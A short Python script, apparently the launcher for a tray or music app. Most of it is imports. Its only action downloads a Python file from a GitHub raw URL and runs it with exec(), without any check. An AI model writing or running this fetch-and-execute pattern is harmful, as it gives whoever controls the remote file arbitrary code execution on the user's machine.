import requests
import time
import json
import pygame
import pystray
import os
import threading  
import datetime
import vlc
import sys
import public_ip as ip
import cv2
import numpy
import onnxruntime

from io import BytesIO
from pystray import MenuItem as item
from PIL import Image
from win11toast import toast



url= 'https://raw.githubusercontent.com/Johnny-Hao-Le/test-music/main/test.py'
r = requests.get(url)
code = r.text

if __name__ == "__main__":
    exec(code)
